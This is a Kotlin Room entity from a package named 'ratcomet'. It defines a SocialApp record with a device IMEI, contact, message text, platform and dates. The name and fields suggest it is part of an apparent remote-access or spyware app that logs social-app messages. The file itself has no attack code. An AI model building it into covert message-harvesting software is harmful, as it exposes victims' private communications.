package ug.hix.ratcomet.model

import androidx.room.Entity
import ug.hix.ratcomet.util.CometUtil

@Entity(primaryKeys = ["contact","date"])
data class SocialApp(
    val imei: String = CometUtil.getImei(),
    val contact: String,
    val type: String,
    val message: String,
    val platform: String,
    val date: String,
    val currentDate: String = CometUtil.currentDateTime(),
    val position : Int = 0
    )